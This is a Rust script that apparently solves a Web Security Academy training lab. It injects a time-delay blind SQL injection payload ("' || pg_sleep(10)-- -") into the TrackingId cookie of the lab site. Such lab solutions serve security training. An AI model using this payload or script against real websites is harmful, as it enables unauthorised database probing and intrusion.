/******************************************************************************
*
* Lab: Blind SQL injection with time delays
*
* Hack Steps: 
*      1. Inject payload into 'TrackingId' cookie to cause a 10 seconds delay
*      2. Wait for the response
*
*******************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0ab2009f04f00d1d824e6a2d00b000fc.web-security-academy.net";

fn main() {
    println!("⦗#⦘ Injection point: {}", "TrackingId".yellow());
    print!("❯❯ Injecting payload to cause a 10 seconds delay.. ");
    io::stdout().flush().unwrap();

    let payload = "' || pg_sleep(10)-- -";
    fetch_with_cookie("/filter?category=Pets", &payload);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solvd".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch_with_cookie(path: &str, cookie: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("TrackingId={cookie}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}
